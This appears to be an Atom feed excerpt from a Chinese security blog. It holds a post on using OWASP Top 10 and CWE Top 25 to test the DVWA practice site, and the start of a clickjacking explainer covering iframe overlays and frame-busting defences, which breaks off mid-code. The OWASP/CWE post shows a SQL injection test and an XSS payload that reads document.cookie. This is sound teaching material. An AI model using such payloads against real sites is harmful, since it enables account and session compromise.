&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/&quot;&gt;資安科普番外篇（二）-如何有效率選擇風險進行修復 feat.風險和法規息息相關？！&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;#&lt;/a&gt; 參考資料&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/141753&quot;&gt;資安廠商分析 SolarWinds 供應鏈攻擊後門程式，研判駭客自去年底開始攻擊&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>資安規範實戰篇 : OWASP + CWE</title>
		<link href="https://tech-blog.cymetrics.io/posts/nick/owasp-cwe/"/>
		<updated>2021-08-23T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/nick/owasp-cwe/</id>
		<content type="html">
		  &lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;!-- summary --&gt;
&lt;p&gt;沒有人希望自己的網站被攻擊，但工程師想做好資安防護就像廚師想燒出一桌好菜，剛開始想參考食譜來做菜，發現食譜種類好多，同一道菜有好各式各樣的做法，到底該怎麼選怎麼做才對 ?&lt;/p&gt;
&lt;p&gt;選擇太多會讓開發人員一陣混亂，本文的目標就是整理 2 個由名國際組織整理出來對資安漏洞的排名與分類，然後藉由靶站來示範如何利用這些資料，快速的找網站可能的漏洞與修補建議。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E6%9C%89%E9%82%A3%E4%BA%9B%E8%B3%87%E5%AE%89%E8%A6%8F%E7%AF%84-%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%9C%89%E9%82%A3%E4%BA%9B%E8%B3%87%E5%AE%89%E8%A6%8F%E7%AF%84-%3F&quot;&gt;#&lt;/a&gt; 有那些資安規範 ?&lt;/h2&gt;
&lt;p&gt;要先看懂食譜才有辦法做菜 ! 所以這邊介紹 2 組由知名國際組織整理出來的常見資安問題排名，然後利用知名靶站 DVWA(註1) 來示範如何利用這些資訊，達到快速找出網站常見問題的目的。&lt;/p&gt;
&lt;h3 id=&quot;owasp-top-10%EF%BC%88open-web-application-security-project%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#owasp-top-10%EF%BC%88open-web-application-security-project%EF%BC%89&quot;&gt;#&lt;/a&gt; OWASP TOP 10（Open Web Application Security Project）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;簡介&lt;/strong&gt;:&lt;br&gt;
藉由社群的力量蒐集各種網頁安全漏洞，歸納出容易攻擊的弱點，定期彙整出前 10 大資安問題，更新頻率較高（2~4 年）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;命名方式&lt;/strong&gt;:&lt;br&gt;
排名 + 發布年份 + 漏洞名稱&lt;br&gt;
 ex. A1:2017-Injection （2017 年排名第 1 的漏洞為注入問題）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用範例&lt;/strong&gt;:
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;選擇要檢查的問題&lt;/strong&gt;:&lt;br&gt;
到 Owap Top 10 (&lt;a href=&quot;https://owasp.org/www-project-top-ten/&quot;&gt;https://owasp.org/www-project-top-ten/&lt;/a&gt;)點選要查詢的類型，這邊選排名第一的 Injection 問題為當範例。&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;找出問題發生特徵&lt;/strong&gt;:&lt;br&gt;
點進去找一下問題可能發生在哪裡，或是如何分辨問題，範例中從 Attack Vectors 的敘述得知 Injection 類型的問題只要在有輸入的地方都有可能發生。&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;找出可能的問題點&lt;/strong&gt;:&lt;br&gt;
到自己的網站找出所有可疑的地方，範例中是 DVWA 準備好的 SQL Injection 弱點輸入位置，該位置原本的功能是輸入 ID 編號來查詢用戶資料，實際上測試的時候應該要把全部的問題點都找出來。&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_4.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;測試是否真的有弱點&lt;/strong&gt;:&lt;br&gt;
對輸入點進行測試來驗證是否真的有弱點(如果對該弱點不熟悉的話可以參考 Owasp 中的 Example Attack Scenarios 欄位)，範例中是靶站準備好的 SQL Injection 弱點，攻擊方法是選自 Owasp 的 Example 中利用 SQL 語法的 OR 來導出所有資料。&lt;br&gt;
4-1. Owasp 提供的 Injection 弱點範例&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_5.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
4-2. DVWA Injection 弱點攻擊測試&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_6_2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;嘗試修復發現的問題&lt;/strong&gt;:&lt;br&gt;
參考 Owasp 中 How to Prevent 欄位提供的建議進行修復。&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_7.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;cwe-%2F-sans-top-25-%EF%BC%88common-weakness-enumeration%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#cwe-%2F-sans-top-25-%EF%BC%88common-weakness-enumeration%EF%BC%89&quot;&gt;#&lt;/a&gt; CWE / SANS TOP 25 （Common Weakness Enumeration）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;簡介:&lt;br&gt;
由國際組織 MITRE 主導，透過對 SANS 與其他資安專家進行訪談調查來制定通用缺陷列表，彙整為前 25 大資安問題，更新頻率較低（8 年）。&lt;/li&gt;
&lt;li&gt;命名方式:&lt;br&gt;
發現順序 + 漏洞名稱&lt;br&gt;
 ex. CWE-79 Cross-site Scripting (XSS)&lt;br&gt;
（2021 年排名第 2 的漏洞為跨站腳本，排名需查表）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用範例&lt;/strong&gt;:
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;選擇要檢查的問題&lt;/strong&gt;:&lt;br&gt;
到 CWE Top 25 (&lt;a href=&quot;https://cwe.mitre.org/top25/archive/2020/2020_cwe_top25.html&quot;&gt;https://cwe.mitre.org/top25/archive/2020/2020_cwe_top25.html&lt;/a&gt;)點選要查找的問題，這邊以排名第一的 Cross-site Scripting 問題為例。&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_8.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;找出問題發生特徵&lt;/strong&gt;:&lt;br&gt;
從敘述中找出關於問題發生點的資訊&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_9.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;找出所有可能的問題點&lt;/strong&gt;:&lt;br&gt;
到自己的網站找出所有可疑的地方，範例中是 DVWA 準備好的 XSS 弱點輸入位置，該位置原本的功能是將輸入文字顯示出來，實際上測試的時候應該要把全部的問題點都找出來。&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_10.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;逐個測試是否真的有弱點&lt;/strong&gt;:&lt;br&gt;
對輸入點進行測試來驗證是否真的有弱點(如果對該弱點不熟悉的話可以參考 CWE 中的 Demonstrative Examples 欄位)，範例中是靶站準備好的 XSS 弱點，攻擊方法是參考 CWE 的 Example 中利用 JS 語法的 Alert 來彈出視窗，但這邊進行深入一點的攻擊藉由彈出視窗的機會導出較敏感的 Cookie 資訊。&lt;br&gt;
4-1. CWE 提供的 XSS 弱點範例&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_11.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
4-2. 輸入下列 script 進行攻擊測試&lt;br&gt;
&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_12.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
4-3. 攻擊結果&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_13.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;嘗試修復發現的問題&lt;/strong&gt;:&lt;br&gt;
參考 CWE 中 Potential Mitigations 欄位中的建議進行修復。&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_14.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;%E6%9C%89%E5%95%8F%E9%A1%8C%E5%85%88%E6%89%BE%E8%AA%B0-%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%9C%89%E5%95%8F%E9%A1%8C%E5%85%88%E6%89%BE%E8%AA%B0-%3F&quot;&gt;#&lt;/a&gt; 有問題先找誰 ?&lt;/h2&gt;
&lt;p&gt;OWASP 跟 CWE，重視效率的開發者可能覺得 Owasp Top 10 選了前 10 常見的問題，先解決這 10 個問題才是 CP 值最高的做法，實際上並非如此，原因就藏在這張 Owasp Top 10 與 CWE Top 25 的對照表中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/owasp-cwe/owasp_15.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;從這張圖可以明顯看出來雖然 Owasp Top 10 項目較少，但它每一個項目的範圍較大，換句話說處理 Owasp 不會比 CWE 快多少，實際上含蓋的範圍大小是差不多的，當今天你做資安檢測不是為了來自業主的合規需求時，選擇那一個規範優其實是由目的來決定的。&lt;/p&gt;
&lt;p&gt;當使用者擔心自己的網站有資安問題，想要解決掉問題的時候會推薦先找 CWE ，因為它的項目分的比較細，說明與解決方案比起 Owasp 比來更具有針對性，所以藉由這些說明解決問題的機率也更高，這邊用兩種規範排名都很高的 Injection 舉個例子，開發者肯定知道自己的網站有沒有用到資料庫，假設有用到的話就要特別注意網站有沒有 SQL Injection 問題，當要藉由這些資安規範來解決問題時，查詢 &lt;a href=&quot;https://cwe.mitre.org/data/definitions/89.html&quot;&gt;CWE-89 SQL Injection&lt;/a&gt; 裡面的資料會比起 &lt;a href=&quot;https://owasp.org/www-project-top-ten/2017/A1_2017-Injection&quot;&gt;Owasp A1:2017-Injection&lt;/a&gt; 更有效率。&lt;/p&gt;
&lt;p&gt;當使用者要評估一個不一定是自己的網站到底安不安全，則會建議先用 Owasp，一樣用 Injection 來舉一個例子，當你今天發現別人開發的網站上有一個輸入欄位沒有進行任何檢查，可以輸入所有種號的特殊符號，但你不確定後面用的是哪種技術或套件，這時候 &lt;a href=&quot;https://owasp.org/www-project-top-ten/2017/A1_2017-Injection&quot;&gt;Owasp A1:2017-Injection&lt;/a&gt; 就有關於 Injection 的整體評估和分析後面可能用了哪些套件會導致問題發生，而 CWE 的話還要想辦法做進一步測試才能確定屬於那一個類型。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;分享一下對於網站開發人員建議的資安檢視步驟，與各類標準使用時機。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 確認開發工具與套件版本 : CVE&lt;/strong&gt;&lt;br&gt;
在開發之前請先去到 CVE Details 查一下用到的工具或套件是否已有弱點，用了有弱點的套件或工具開發高機率導致網站先天不良，如果非用不可則需要把弱點藏好或避開有弱點的功能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 避開常見弱點 : OWASP TOP 10, CWE TOP 25&lt;/strong&gt;&lt;br&gt;
從開始開發到完成這個階段特別要注意避開常見的資安問題，畢竟資安要做到完美成本過高，一般網站很難做到 100 分，但解決常見弱點能大幅的增加駭客攻擊成本，你家的鎖只要比鄰居家的鎖更好，小偷就不喜歡到你家偷東西，沒有人願意把時間在難搞的目標上，駭客也是一樣。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 安全性測試(模擬攻擊） : ATT&amp;amp;CK&lt;/strong&gt;&lt;br&gt;
不管是處理完弱點或建立好防護後都需要一個驗證的機制，模擬一下駭客的攻擊是否會成功，避免做了白工卻不自知，這時候最好的方法是交給第三方的資安廠商來做測試，不只有專業的資安人員為你服務，也能避免測試時球員兼裁判的問題，但礙於成本考量或者網站屬於不可公開的內部系統，就推薦參考 ATT&amp;amp;CK 來自行建立一個較全面的測試，降低前述問題帶來的影響。&lt;/p&gt;
&lt;p&gt;本文主要介紹的內容與第 2 項避開常見弱點有比較直接的關係，這部份是與開發最相關也是影響最大的一部分，之後有機會在分享有關第 1 項與第 3 項中用到的其他類型資安規範。&lt;/p&gt;
&lt;h2 id=&quot;%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;#&lt;/a&gt; 參考資料&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://owasp.org/&quot;&gt;https://owasp.org/&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://cwe.mitre.org/&quot;&gt;https://cwe.mitre.org/&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://cve.mitre.org/&quot;&gt;https://cve.mitre.org/&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://www.cvedetails.com/&quot;&gt;https://www.cvedetails.com/&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://attack.mitre.org/&quot;&gt;https://attack.mitre.org/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>不識廬山真面目：Clickjacking 點擊劫持攻擊</title>
		<link href="https://tech-blog.cymetrics.io/posts/huli/clickjacking-intro/"/>
		<updated>2021-08-26T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/huli/clickjacking-intro/</id>
		<content type="html">
		  &lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;!-- summary --&gt;
&lt;p&gt;在針對前端的各種攻擊手法之中，我覺得 clickjacking 是相當有趣的一個。它的中文翻譯通常翻成「點擊劫持」，實際上的意思是你以為點了 A 網頁的東西，其實卻是點到了 B 網頁，惡意網頁劫持了使用者的點擊，讓使用者點到意料之外的地方。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;只是一個點擊而已，這樣會有什麼危害嗎？&lt;/p&gt;
&lt;p&gt;假設在背後的是一個銀行轉帳頁面，而且帳號跟金額都填好了，只要按一個按鈕就會轉錢出去，這樣的話危害就很大了（不過這通常不太可能啦，因為轉帳還需要輸入 OTP 之類的，這只是舉例）。&lt;/p&gt;
&lt;p&gt;或是舉個更常見的例子，例如說有個乍看之下是取消訂閱電子報的頁面，於是你點了「確定取消」的按鈕，但其實底下藏著的是 Facebook 的按讚鈕，所以你不但沒有取消訂閱，還被騙了一個讚（因為劫持的目標是讚，所以又稱為 likejacking）。&lt;/p&gt;
&lt;p&gt;這篇文章我會介紹 clickjacking 的攻擊原理、防禦方式以及實際案例，讓大家更了解這個攻擊手法。&lt;/p&gt;
&lt;h2 id=&quot;clickjacking-%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#clickjacking-%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86&quot;&gt;#&lt;/a&gt; Clickjacking 攻擊原理&lt;/h2&gt;
&lt;p&gt;Clickjacking 的原理就是把兩個網頁疊在一起，透過 CSS 讓使用者看見的是 A 網頁，但點到的卻是 B 網頁。&lt;/p&gt;
&lt;p&gt;以比較技術的講法來說，就是用 iframe 把 B 網頁嵌入然後設透明度 0.001，再用 CSS 把自己的內容疊上去，就大功告成了。&lt;/p&gt;
&lt;p&gt;我覺得 clickjacking 直接看範例是最有趣的，因此做了一些簡單的範例。&lt;/p&gt;
&lt;p&gt;底下這個範例可以先點擊「確定取消」的按鈕，然後再點「切換透明度」，就可以看到背後其實是修改個人資料的頁面以及刪除帳號的按鈕：&lt;/p&gt;
&lt;iframe src=&quot;https://aszx87410.github.io/demo/clickjacking/&quot; width=&quot;320&quot; height=&quot;430&quot;&gt;&lt;/iframe&gt;
&lt;p&gt;所以我以為我點了「確定取消」，但實際上點到的卻是「刪除帳號」，這就是 clickjacking。&lt;/p&gt;
&lt;p&gt;上面的 iframe 如果打不開，可以去這邊玩：&lt;a href=&quot;https://aszx87410.github.io/demo/clickjacking/&quot;&gt;clickjacking 範例&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;有些人可能會覺得這個範例太過簡單，實際應用中可能很少出現這種這麼簡單的攻擊，只要按一個按鈕而已，或許更多網站會更複雜一點，例如說要先輸入一個什麼東西？&lt;/p&gt;
&lt;p&gt;底下這個範例以「更改 email」這個功能來設計 clickjacking，比起前一個範例是整個網頁蓋過去，這個範例刻意留下原網頁的 input，其他都用 CSS 蓋掉，按鈕的部分用 &lt;code&gt;pointer-events:none&lt;/code&gt; 讓事件穿透。&lt;/p&gt;
&lt;p&gt;看似是一個輸入 email 訂閱資訊的網頁，但按下確定之後卻跳出「修改 email 成功」，因為背後其實是個修改 email 的網頁：&lt;/p&gt;
&lt;iframe src=&quot;https://aszx87410.github.io/demo/clickjacking/adv.html&quot; width=&quot;340&quot; height=&quot;450&quot;&gt;&lt;/iframe&gt;
&lt;p&gt;上面的範例沒看到的話，可以去這邊玩：&lt;a href=&quot;https://aszx87410.github.io/demo/clickjacking/adv.html&quot;&gt;進階 clickjacking 範例&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;除此之外，我也有在&lt;a href=&quot;https://blog.miniasp.com/post/2008/10/11/The-latest-cross-browser-exploit-Clickjacking&quot;&gt;最新的跨瀏覽器攻擊手法：Clickjacking&lt;/a&gt; 這篇裡面看到一個很有趣的範例：&lt;a href=&quot;https://www.youtube.com/watch?v=gxyLbpldmuU&quot;&gt;假遊戲真劫持（YouTube 影片）&lt;/a&gt;，看似是遊戲但其實只是為了讓你去點按鈕，超級有趣！&lt;/p&gt;
&lt;p&gt;寫到這邊，幫 clickjacking 做個總結，這個攻擊手法大概就是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;把目標網頁嵌入惡意網頁之中（透過 iframe 或其他類似標籤）&lt;/li&gt;
&lt;li&gt;在惡意網頁上用 CSS 把目標網頁蓋住，讓使用者看不見&lt;/li&gt;
&lt;li&gt;誘導使用者前往惡意網頁並且做出操作（輸入或點擊等等）&lt;/li&gt;
&lt;li&gt;觸發目標網頁行為，達成攻擊&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因此實際上攻擊的難易度，取決於你的惡意網站設計得怎麼樣，以及目標網頁的原始行為需要多少互動。舉例來說，點擊按鈕就比輸入資訊要容易得多。&lt;/p&gt;
&lt;p&gt;然後還要提醒一點，這種攻擊要達成，使用者要先在目標網站是登入狀態才行。只要能把目標網頁嵌入惡意網頁之中，就會有 clickjacking 的風險。&lt;/p&gt;
&lt;h2 id=&quot;clickjacking-%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#clickjacking-%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F&quot;&gt;#&lt;/a&gt; Clickjacking 防禦方式&lt;/h2&gt;
&lt;p&gt;如同前面所述，只要能被其他網頁嵌入就會有風險，換句話說，如果沒辦法被嵌入，就不會有 clickjacking 的問題了，這就是解決 clickjacking 的方式。&lt;/p&gt;
&lt;p&gt;一般來說點擊劫持的防禦方式可以分為兩種，一種是自己用 JavaScript 檢查，另一種是透過 response header 告知瀏覽器這個網頁是否能被嵌入。&lt;/p&gt;
&lt;h3 id=&quot;frame-busting&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#frame-busting&quot;&gt;#&lt;/a&gt; Frame busting&lt;/h3&gt;
&lt;p&gt;有一種叫做 frame busting 的方式，就是我前面提到的自己用 JavaScript 檢查，原理很簡單，程式碼也很簡單：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;top &lt;span class=&quot;token operator&quot;&gt;!==&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每一個網頁都有自己的 window object，而 &lt;code&gt;window.self&lt;/code&gt; 指向的會是自己的 window，那 top 的話就是 top window，可以想成是這整個瀏覽器的「分頁」最上層的 window。&lt;/p&gt;
&lt;p&gt;如果今天是被獨立開啟的網頁，那 top 跟 self 就會指向同一個 window，但如果今天網頁是被鑲在 iframe 裡面，top 指的就會是使用 iframe 的那個 window。&lt;/p&gt;
&lt;p&gt;舉個例子好了，假設今天我在 localhost 有個 index.html，裡面寫著：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://example.com&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;iframe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://onedegree.hk&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;iframe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那關係圖就會是這樣：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/clickjacking-intro/top.png&quot; alt=&quot;window 關係圖&quot;&gt;&lt;/p&gt;
&lt;p&gt;綠色跟黃色分別是兩個以 iframe 載入的網頁，也就是兩個不同的 window，在這兩個網頁裡面如果存取 &lt;code&gt;top&lt;/code&gt; 的話，就會是 &lt;code&gt;localhost/index.html&lt;/code&gt; 的 window object。&lt;/p&gt;
&lt;p&gt;所以透過 &lt;code&gt;if (top !== self)&lt;/code&gt; 的檢查，就可以知道自己是不是被放在 iframe 裡面。如果是的話，就改變 top.location，把最上層的網頁導向其他地方。&lt;/p&gt;
&lt;p&gt;聽起來很美好而且沒什麼問題，但其實會被 iframe 的 &lt;code&gt;sandbox&lt;/code&gt; 屬性繞過。&lt;/p&gt;
&lt;p&gt;iframe 可以設置一個屬性叫做 &lt;code&gt;sandbox&lt;/code&gt;，代表這個 iframe 的功能受到限制，如果要把限制打開必須明確指定，可以指定的值包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;allow-forms，允許提交表單&lt;/li&gt;
&lt;li&gt;allow-scripts，允許執行 JS&lt;/li&gt;
&lt;li&gt;allow-top-navigation，允許改變 top location&lt;/li&gt;
&lt;li&gt;allow-popups，允許彈出視窗&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;（還有一大堆，詳情可參考 &lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe&quot;&gt;MDN: iframe&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;也就是說，如果我是這樣載入 iframe 的：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;./busting.html&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;sandbox&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;allow-forms allow-scripts&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那就算 busting.html 有上面我說的那個防護也沒有用，因為 JavaScript 不會執行，所以那段 script 就不會跑到，但 user 還是可以正常 submit 表單。&lt;/p&gt;
&lt;p&gt;於是就有人提出了更實用的方法，在現有基礎上做一些改良（程式碼取自：&lt;a href=&quot;https://en.wikipedia.org/wiki/Framekiller&quot;&gt;Wikipedia - Framekiller&lt;/a&gt;）：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token style&quot;&gt;&lt;span class=&quot;token language-css&quot;&gt;&lt;span class=&quot;token selector&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;none&lt;span class=&quot;token 